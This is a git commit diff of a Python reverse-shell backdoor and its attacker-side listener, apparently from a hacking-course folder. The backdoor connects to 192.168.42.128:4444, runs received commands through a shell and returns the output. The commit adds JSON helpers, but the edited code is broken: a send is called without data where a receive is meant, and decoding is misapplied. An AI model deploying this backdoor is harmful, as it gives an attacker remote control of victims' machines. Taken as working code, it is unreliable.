9104d34d80c2e689a47744258435c2774ffeb45a
Sumeet Singh <sumeet605@gmail.com>
2024-08-07 18:43:32 -0400

    v

--- 10_Backdoor/backdoor.py
+++ 10_Backdoor/backdoor.py
@@ -1,20 +1,30 @@
 import socket
 import subprocess
+import json
 
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip, port))        
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    def reliable_receive(self):
+        json_data = json.dumps(self.connection.recv(1024))
+        return json.loads(json_data.decode())
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
     def run(self):
         while True:
-            command = self.connection.recv(1024)
-            command_result = self.execute_system_command(command.decode())
+            command = self.reliable_send()
+            command_result = self.execute_system_command(command)
             self.connection.send(command_result)
         connection.close()
-        
+
+
 my_backdoor = Backdoor("192.168.42.128", 4444)
 my_backdoor.run()
--- 10_Backdoor/listener.py
+++ 10_Backdoor/listener.py
@@ -1,5 +1,5 @@
 import socket
-
+import json
 
 class Listener:
     def __init__(self, ip, port):
@@ -13,14 +13,22 @@ class Listener:
         self.connection, address = listener.accept()
         print(f"[+] Got a connection from {address}.")
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+        
+    def reliable_receive(self):
+        json_data = json.dumps(self.connection.recv(1024))
+        return json.loads(json_data.decode())
+
     def execute_remotely(self, command):
-        self.connection.send(command.encode())
-        return self.connection.recv(1024)
+        self.reliable_send()
+        return self.reliable_receive()
 
     def run(self):
         while True:
             command = input(">> ")
-            print(self.execute_remotely(command).decode())
+            print(self.execute_remotely(command))
 
 
 my_listener = Listener("192.168.42.128", 4444)
